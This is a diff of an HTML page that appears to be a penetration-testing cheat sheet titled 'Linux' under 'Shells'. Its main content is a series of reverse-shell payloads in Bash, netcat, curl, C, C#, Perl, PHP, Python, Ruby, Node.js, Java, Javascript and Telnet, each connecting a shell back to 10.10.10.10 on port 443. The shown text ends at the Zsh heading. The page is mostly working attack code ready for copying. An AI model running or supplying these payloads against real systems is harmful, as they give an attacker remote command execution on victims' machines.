+                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+                    
+                </div>
+                <div class="big">
+                    
+                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+                    
+                </div>
+            </a>
+            <button id="close-sidebar" class="btn btn-icon btn-soft">
+                <span class="material-icons size-20 menu-icon align-middle">menu</span>
+            </button>
+            
+            
+                    
+                    <button id="flexsearch-button" class="ms-3 btn btn-soft" data-bs-toggle="collapse" data-bs-target="#FlexSearchCollapse" aria-expanded="false" aria-controls="FlexSearchCollapse">
+                        <span class="material-icons size-20 menu-icon align-middle">search</span>
+                        <span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span>
+                        <div class="d-none d-sm-block">
+                            <span class="flexsearch-button-keys">
+                                <kbd class="flexsearch-button-cmd-key">
+                                    <svg width="44" height="15"><path d="M2.118,11.5A1.519,1.519,0,0,1,1,11.042,1.583,1.583,0,0,1,1,8.815a1.519,1.519,0,0,1,1.113-.458h.715V6.643H2.118A1.519,1.519,0,0,1,1,6.185,1.519,1.519,0,0,1,.547,5.071,1.519,1.519,0,0,1,1,3.958,1.519,1.519,0,0,1,2.118,3.5a1.519,1.519,0,0,1,1.114.458A1.519,1.519,0,0,1,3.69,5.071v.715H5.4V5.071A1.564,1.564,0,0,1,6.976,3.5,1.564,1.564,0,0,1,8.547,5.071,1.564,1.564,0,0,1,6.976,6.643H6.261V8.357h.715a1.575,1.575,0,0,1,1.113,2.685,1.583,1.583,0,0,1-2.227,0A1.519,1.519,0,0,1,5.4,9.929V9.214H3.69v.715a1.519,1.519,0,0,1-.458,1.113A1.519,1.519,0,0,1,2.118,11.5Zm0-.857a.714.714,0,0,0,.715-.714V9.214H2.118a.715.715,0,1,0,0,1.429Zm4.858,0a.715.715,0,1,0,0-1.429H6.261v.715a.714.714,0,0,0,.715.714ZM3.69,8.357H5.4V6.643H3.69ZM2.118,5.786h.715V5.071a.714.714,0,0,0-.715-.714.715.715,0,0,0-.5,1.22A.686.686,0,0,0,2.118,5.786Zm4.143,0h.715a.715.715,0,0,0,.5-1.22.715.715,0,0,0-1.22.5Z" fill="currentColor"></path><path d="M12.4,11.475H11.344l3.879-7.95h1.056Z" fill="currentColor"></path><path d="M25.073,5.384l-.864.576a2.121,2.121,0,0,0-1.786-.923,2.207,2.207,0,0,0-2.266,2.326,2.206,2.206,0,0,0,2.266,2.325,2.1,2.1,0,0,0,1.782-.918l.84.617a3.108,3.108,0,0,1-2.622,1.293,3.217,3.217,0,0,1-3.349-3.317,3.217,3.217,0,0,1,3.349-3.317A3.046,3.046,0,0,1,25.073,5.384Z" fill="currentColor"></path><path d="M30.993,5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172Z" fill="currentColor"></path><path d="M34.67,4.164c1.471,0,2.266.658,2.266,1.851,0,1.087-.832,1.809-2.134,1.855l2.107,2.691h-1.28L33.591,7.87H33.07v2.691H32.038v-6.4Zm-1.6.969v1.8h1.572c.832,0,1.22-.3,1.22-.918s-.411-.882-1.22-.882Z" fill="currentColor"></path><path d="M42.883,10.561H38.31v-6.4h1.033V9.583h3.54Z" fill="currentColor"></path></svg>
+                                </kbd>
+                                <kbd class="flexsearch-button-key">
+                                    <svg width="15" height="15"><path d="M5.926,12.279H4.41L9.073,2.721H10.59Z" fill="currentColor"/></svg>
+                                </kbd>
+                            </span>
+                        </div>
+                    </button>
+                
+            </div>
+
+        <div class="d-flex align-items-center">
+            <ul class="list-unstyled mb-0">
+                
+            </ul>
+            <button id="mode" class="btn btn-icon btn-default ms-2" type="button" aria-label="Toggle user interface mode">
+                <span class="toggle-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentColor">
+                        <title>Enable dark mode</title>
+                        <path d="M24 42q-7.5 0-12.75-5.25T6 24q0-7.5 5.25-12.75T24 6q.4 0 .85.025.45.025 1.15.075-1.8 1.6-2.8 3.95-1 2.35-1 4.95 0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6 0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42Zm0-3q5.45 0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75 0-9.775-4.025T19.2 15q0-1.2.25-2.575.25-1.375.9-3.125-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39Zm-.2-14.85Z"/>
+                    </svg>
+                </span>
+                <span class="toggle-light">
+                    <svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentColor">
+                        <title>Enable light mode</title>
+                        <path d="M24 31q2.9 0 4.95-2.05Q31 26.9 31 24q0-2.9-2.05-4.95Q26.9 17 24 17q-2.9 0-4.95 2.05Q17 21.1 17 24q0 2.9 2.05 4.95Q21.1 31 24 31Zm0 3q-4.15 0-7.075-2.925T14 24q0-4.15 2.925-7.075T24 14q4.15 0 7.075 2.925T34 24q0 4.15-2.925 7.075T24 34ZM3.5 25.5q-.65 0-1.075-.425Q2 24.65 2 24q0-.65.425-1.075Q2.85 22.5 3.5 22.5h5q.65 0 1.075.425Q10 23.35 10 24q0 .65-.425 1.075-.425.425-1.075.425Zm36 0q-.65 0-1.075-.425Q38 24.65 38 24q0-.65.425-1.075.425-.425 1.075-.425h5q.65 0 1.075.425Q46 23.35 46 24q0 .65-.425 1.075-.425.425-1.075.425ZM24 10q-.65 0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2q.65 0 1.075.425.425.425.425 1.075v5q0 .65-.425 1.075Q24.65 10 24 10Zm0 36q-.65 0-1.075-.425-.425-.425-.425-1.075v-5q0-.65.425-1.075Q23.35 38 24 38q.65 0 1.075.425.425.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46ZM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05 0 .6-.4 1-.4.45-1.025.45-.625 0-1.075-.4Zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45ZM33.9 14.1q-.45-.45-.45-1.05 0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4-.625 0-1.075-.4ZM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6 0 1.05.45.45.45.45 1.05 0 .6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425ZM24 24Z"/>
+                    </svg>
+                </span>
+            </button>
+            
+        </div>
+    </div>
+    
+    
+            <div class="collapse" id="FlexSearchCollapse">
+                <div class="flexsearch-container">
+                    <div class="flexsearch-keymap">
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to navigate</span>
+                        </li>
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to select</span>
+                        </li>
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to close</span>
+                        </li>
+                    </div>
+                    <form class="flexsearch position-relative flex-grow-1 ms-2 me-2">
+                        <div class="d-flex flex-row">
+                            <input id="flexsearch" class="form-control" type="search" placeholder="Search" aria-label="Search" autocomplete="off">
+                            <button id="hideFlexsearch" type="button" class="ms-2 btn btn-soft">
+                                cancel
+                            </button>
+                        </div>
+                        <div id="suggestions" class="shadow rounded-1 d-none"></div>
+                    </form>
+                </div>
+            </div>
+        
+    
+    
+</div>
+
+                            <div class="container-fluid">
+                                <div class="layout-spacing">
+                                    
+                                        <div class="d-md-flex justify-content-between align-items-center"><nav aria-label="breadcrumb" class="d-inline-block pb-2 mt-1 mt-sm-0">
+    <ul id="breadcrumbs" class="breadcrumb bg-transparent mb-0" itemscope itemtype="https://schema.org/BreadcrumbList">
+        
+            
+                <li class="breadcrumb-item text-capitalize active" aria-current="page" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/docs/">
+                        <i class="material-icons size-20 align-text-bottom" itemprop="name">Home</i>
+                    </a>
+                    <meta itemprop="position" content='1' />
+                </li>
+            
+            
+                <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/docs/shells/">
+                        <span itemprop="name">Shells</span>
+                    </a>
+                    <meta itemprop="position" content='2' />
+                </li>
+            
+        
+            <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                <span itemprop="name">Linux</span>
+                <meta itemprop="position" content='3' />
+            </li>
+        
+    </ul>
+</nav></div>
+                                    
+                                    <div class="row flex-xl-nowrap">
+                                        
+                                        <div class="docs-toc col-xl-3    d-xl-block"><toc>
+    <div class="fw-bold text-uppercase mb-2">On this page</div>
+    <nav id="toc">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#reverse">Reverse</a>
+          <ul>
+            <li><a href="#bash">Bash</a></li>
+            <li><a href="#nc">NC</a></li>
+            <li><a href="#curl">Curl</a></li>
+            <li><a href="#c">C</a></li>
+            <li><a href="#c-1">C#</a></li>
+            <li><a href="#perl">Perl</a></li>
+            <li><a href="#php">PHP</a></li>
+            <li><a href="#python">Python</a></li>
+            <li><a href="#ruby">Ruby</a></li>
+            <li><a href="#nodejs">Node.js</a></li>
+            <li><a href="#java">Java</a></li>
+            <li><a href="#javascript">Javascript</a></li>
+            <li><a href="#telnet">Telnet</a></li>
+            <li><a href="#zsh">Zsh</a></li>
+            <li><a href="#lua">Lua</a></li>
+            <li><a href="#awk">AWK</a></li>
+            <li><a href="#dart">Dart</a></li>
+          </ul>
+        </li>
+        <li><a href="#bind">Bind</a>
+          <ul>
+            <li><a href="#python-1">Python</a></li>
+            <li><a href="#php-1">PHP</a></li>
+            <li><a href="#nc-1">NC</a></li>
+            <li><a href="#perl-1">Perl</a></li>
+          </ul>
+        </li>
+        <li><a href="#metasploit">Metasploit</a>
+          <ul>
+            <li><a href="#linux-meterpreter-staged">Linux Meterpreter Staged</a></li>
+            <li><a href="#linux-meterpreter-stageless">Linux Meterpreter Stageless</a></li>
+            <li><a href="#php-meterpreter-stageless">PHP Meterpreter Stageless</a></li>
+            <li><a href="#reverse-php">Reverse PHP</a></li>
+            <li><a href="#jsp-stageless">JSP Stageless</a></li>
+            <li><a href="#war-stageless-reverse">War Stageless Reverse</a></li>
+            <li><a href="#python-stageless-reverse">Python Stageless Reverse</a></li>
+            <li><a href="#bash-stageless-reverse">Bash Stageless Reverse</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </toc></div>
+                                        
+                                        
+                                        <div class="docs-toc-mobile    d-print-none d-xl-none">
+                                            <button id="toc-dropdown-btn" class="btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" data-bs-offset="0,0" aria-expanded="false">
+                                                Table of Contents
+                                            </button>
+<nav id="toc-mobile">
+  <ul class="dropdown-menu">
+    <li>
+      <ul>
+        <li><a href="#reverse">Reverse</a>
+          <ul>
+            <li><a href="#bash">Bash</a></li>
+            <li><a href="#nc">NC</a></li>
+            <li><a href="#curl">Curl</a></li>
+            <li><a href="#c">C</a></li>
+            <li><a href="#c-1">C#</a></li>
+            <li><a href="#perl">Perl</a></li>
+            <li><a href="#php">PHP</a></li>
+            <li><a href="#python">Python</a></li>
+            <li><a href="#ruby">Ruby</a></li>
+            <li><a href="#nodejs">Node.js</a></li>
+            <li><a href="#java">Java</a></li>
+            <li><a href="#javascript">Javascript</a></li>
+            <li><a href="#telnet">Telnet</a></li>
+            <li><a href="#zsh">Zsh</a></li>
+            <li><a href="#lua">Lua</a></li>
+            <li><a href="#awk">AWK</a></li>
+            <li><a href="#dart">Dart</a></li>
+          </ul>
+        </li>
+        <li><a href="#bind">Bind</a>
+          <ul>
+            <li><a href="#python-1">Python</a></li>
+            <li><a href="#php-1">PHP</a></li>
+            <li><a href="#nc-1">NC</a></li>
+            <li><a href="#perl-1">Perl</a></li>
+          </ul>
+        </li>
+        <li><a href="#metasploit">Metasploit</a>
+          <ul>
+            <li><a href="#linux-meterpreter-staged">Linux Meterpreter Staged</a></li>
+            <li><a href="#linux-meterpreter-stageless">Linux Meterpreter Stageless</a></li>
+            <li><a href="#php-meterpreter-stageless">PHP Meterpreter Stageless</a></li>
+            <li><a href="#reverse-php">Reverse PHP</a></li>
+            <li><a href="#jsp-stageless">JSP Stageless</a></li>
+            <li><a href="#war-stageless-reverse">War Stageless Reverse</a></li>
+            <li><a href="#python-stageless-reverse">Python Stageless Reverse</a></li>
+            <li><a href="#bash-stageless-reverse">Bash Stageless Reverse</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+                                        <div class="docs-content col-12 col-xl-9 mt-0">
+                                            <div class="mb-0 d-flex">
+                                                
+                                                <i class="material-icons title-icon me-2">terminal</i>
+                                                
+                                                <h1 class="content-title mb-0">
+                                                    Linux
+                                                    
+                                                </h1>
+                                            </div>
+                                            
+                                                <p class="lead mb-3"></p>
+                                            
+                                            <div id="content" class="main-content" data-bs-spy="scroll" data-bs-root-margin="0px 0px -65%" data-bs-target="#toc-mobile">
+                                                
+    
+    <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
+        <h2 id="reverse">Reverse <a href="#reverse" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><hr>
+<h3 id="bash">Bash <a href="#bash" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="5800016" class="language-bash ">
   <code>sh -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1</code>
-  </pre></div><hr><h3 id=nc>NC <a href=#nc class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=ccdc7e7 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="nc">NC <a href="#nc" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="ccdc7e7" class="language-bash ">
   <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.10.10 443 &gt;/tmp/f</code>
-  </pre></div><div class=prism-codeblock><pre id=fadab43 class=language-bash>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="fadab43" class="language-bash ">
   <code>nc 10.10.10.10 443 -e sh</code>
-  </pre></div><div class=prism-codeblock><pre id=7fd2c17 class=language-bash>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="7fd2c17" class="language-bash ">
   <code>nc -c sh 10.10.10.10 443</code>
-  </pre></div><hr><h3 id=curl>Curl <a href=#curl class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=9d85a2d class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="curl">Curl <a href="#curl" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="9d85a2d" class="language-bash ">
   <code>C=&#39;curl -Ns telnet://10.10.10.10:443&#39;; $C &lt;/dev/null 2&gt;&amp;1 | sh 2&gt;&amp;1 | $C &gt;/dev/null</code>
-  </pre></div><hr><h3 id=c>C <a href=#c class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=f5d7322 class=language-c>
+  </pre>
+  </div>
+<hr>
+<h3 id="c">C <a href="#c" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f5d7322" class="language-c ">
   <code>#include &lt;stdio.h&gt;
 #include &lt;sys/socket.h&gt;
 #include &lt;sys/types.h&gt;
@@ -56,7 +559,25 @@ int main(void){
 
     return 0;       
 }</code>
-  </pre></div><hr><h3 id=c-1>C# <a href=#c-1 class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=a983759 class=language-cs>
+  </pre>
+  </div>
+<hr>
+<h3 id="c-1">C# <a href="#c-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="a983759" class="language-cs ">
   <code>using System;
 using System.Text;
 using System.IO;
@@ -126,7 +647,24 @@ namespace ConnectBack
 
 	}
 }</code>
-  </pre></div><div class=prism-codeblock><pre id=238813b class=language-cs>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="238813b" class="language-cs ">
   <code>using System;
 using System.Diagnostics;
 
@@ -146,9 +684,44 @@ namespace BackConnect {
 	}
   }
 }</code>
-  </pre></div><hr><h3 id=perl>Perl <a href=#perl class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=169ccec class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="perl">Perl <a href="#perl" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="169ccec" class="language-bash ">
   <code>perl -e &#39;use Socket;$i=&#34;10.10.10.10&#34;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;sh -i&#34;);};&#39;</code>
-  </pre></div><div class=prism-codeblock><pre id=81c037e class=language-perl>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="81c037e" class="language-perl ">
   <code>#!/usr/bin/perl -w
 
 use strict;
@@ -223,9 +796,44 @@ sub cgiprintpage {
 Connection: close\r
 Content-Type: text\/html\r\n\r\n&#34; . $global_page;
 }</code>
-  </pre></div><hr><h3 id=php>PHP <a href=#php class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=359654c class=language-php>
+  </pre>
+  </div>
+<hr>
+<h3 id="php">PHP <a href="#php" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="359654c" class="language-php ">
   <code>&lt;?php system(&#39;bash -c &#34;sh -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#34;&#39;) ?&gt;</code>
-  </pre></div><div class=prism-codeblock><pre id=e330773 class=language-php>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="e330773" class="language-php ">
   <code>&lt;?php
 
 set_time_limit (0);
@@ -340,15 +948,103 @@ function printit ($string) {
 }
 
 ?&gt;</code>
-  </pre></div><hr><h3 id=python>Python <a href=#python class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=657647c class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="python">Python <a href="#python" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="657647c" class="language-bash ">
   <code>export RHOST=&#34;10.10.10.10&#34;;export RPORT=443;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</code>
-  </pre></div><div class=prism-codeblock><pre id=9ef7e2e class=language-bash>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="9ef7e2e" class="language-bash ">
   <code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.10&#34;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)&#39;</code>
-  </pre></div><hr><h3 id=ruby>Ruby <a href=#ruby class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=16e5bc2 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="ruby">Ruby <a href="#ruby" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="16e5bc2" class="language-bash ">
   <code>ruby -rsocket -e&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.10.10&#34;,443))&#39;</code>
-  </pre></div><hr><h3 id=nodejs>Node.js <a href=#nodejs class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=1748158 class=language-js>
+  </pre>
+  </div>
+<hr>
+<h3 id="nodejs">Node.js <a href="#nodejs" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="1748158" class="language-js ">
   <code>require(&#39;child_process&#39;).exec(&#39;nc -e sh 10.10.10.10 443&#39;)</code>
-  </pre></div><div class=prism-codeblock><pre id=45ce4af class=language-js>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="45ce4af" class="language-js ">
   <code>(function(){
     var net = require(&#34;net&#34;),
         cp = require(&#34;child_process&#34;),
@@ -361,7 +1057,25 @@ function printit ($string) {
     });
     return /a/; // Prevents the Node.js application from crashing
 })();</code>
-  </pre></div><hr><h3 id=java>Java <a href=#java class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=82fd2ab class=language-java>
+  </pre>
+  </div>
+<hr>
+<h3 id="java">Java <a href="#java" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="82fd2ab" class="language-java ">
   <code>public class shell {
     public static void main(String[] args) {
         Process p;
@@ -372,7 +1086,24 @@ function printit ($string) {
         } catch (Exception e) {}
     }
 }</code>
-  </pre></div><div class=prism-codeblock><pre id=f8ccd29 class=language-java>
+  </pre>
+  </div>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f8ccd29" class="language-java ">
   <code>import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
@@ -407,7 +1138,25 @@ public class shell {
         } catch (Exception e) {}
     }
 }</code>
-  </pre></div><hr><h3 id=javascript>Javascript <a href=#javascript class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=a262cf8 class=language-js>
+  </pre>
+  </div>
+<hr>
+<h3 id="javascript">Javascript <a href="#javascript" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="a262cf8" class="language-js ">
   <code>String command = &#34;var host = &#39;10.10.10.10&#39;;&#34; &#43;
                        &#34;var port = 443;&#34; &#43;
                        &#34;var cmd = &#39;sh&#39;;&#34;&#43;
@@ -437,17 +1186,124 @@ public class shell {
                        &#34;s.close();&#34;;
 String x = &#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;&#34;&#43;command&#43;&#34;\&#34;)&#34;;
 ref.add(new StringRefAddr(&#34;x&#34;, x));</code>
-  </pre></div><hr><h3 id=telnet>Telnet <a href=#telnet class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=46cff96 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="telnet">Telnet <a href="#telnet" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="46cff96" class="language-bash ">
   <code>TF=$(mktemp -u);mkfifo $TF &amp;&amp; telnet 10.10.10.10 443 0&lt;$TF | sh 1&gt;$TF</code>
-  </pre></div><hr><h3 id=zsh>Zsh <a href=#zsh class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=080d709 class=language-bash>
+  </pre>
+  </div>
+<hr>
+<h3 id="zsh">Zsh <a href="#zsh" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="080d709" class="language-bash ">
